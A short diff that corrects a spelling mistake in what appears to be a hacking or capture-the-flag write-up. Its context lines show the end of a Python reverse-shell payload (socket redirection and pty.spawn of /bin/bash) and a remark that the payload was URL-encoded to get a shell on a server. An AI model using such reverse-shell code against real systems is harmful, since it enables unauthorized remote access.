@@ -30,7 +30,7 @@ os.dup2(s.fileno(),2);
 p=pty.spawn("/bin/bash");
 ```
 
-You can syplly write on your own code then just seach on Google **url encoder** and translate to this
+You can simply write on your own code then just seach on Google **url encoder** and translate to this
 
 We have done this to get a reverse shell and execute cmd on server,
 
